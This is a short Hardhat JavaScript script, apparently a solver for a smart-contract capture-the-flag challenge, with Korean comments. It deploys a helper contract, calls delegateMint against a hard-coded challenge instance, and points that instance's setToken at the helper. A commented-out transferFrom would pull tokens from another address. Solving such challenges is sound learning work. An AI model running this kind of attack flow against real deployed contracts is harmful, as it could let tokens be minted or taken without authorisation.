const { ethers } = require("hardhat");
const eth = ethers.BigNumber.from(10).pow(18);

async function delegateMintERC20tokensol() {
  const [myAccount] = await ethers.getSigners();

  const DelegateMintERC20token = await ethers.getContractFactory(
    "ERC20MintableSolve"
  );
  const delegateMintERC20token = await DelegateMintERC20token.connect(
    myAccount
  ).deploy();
  await delegateMintERC20token.deployed();

  const deploytestContract = DelegateMintERC20token.attach(
    delegateMintERC20token.address
  );
  await deploytestContract.delegateMint(delegateMintERC20token.address);

  console.log(delegateMintERC20token.address, "delegateMintERC20token address");

  const instance = "0x3714AB3Ecc01c08e4ece046Fce0250425924713d"; // 홈페이지에 나온 컨트랙트 주소

  await delegateMintERC20token.delegateMint(instance);

  console.log("finish");

  const ERC20Mintable = await ethers.getContractFactory(
    "ERC20Mintable" // 홈페이지에 나와있는 문제 코드
  );
  const ERC20mintable = ERC20Mintable.attach(instance); // 배포한거에 홈페이지에 나온 컨트랙트 붙이기

  const num = ethers.BigNumber.from(20).mul(eth);
  // await madeERC20tokenProblem.transferFrom(
  //   "0xc9144f98320ec8b34a8b10b1f76a88739eed57d7",
  //   myAccount.address,
  //   num
  // );

  console.log("cool");

  const result = ERC20mintable.connect(myAccount).setToken(
    delegateMintERC20token.address
  );
  console.log(result);
}

async function main() {
  delegateMintERC20tokensol();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
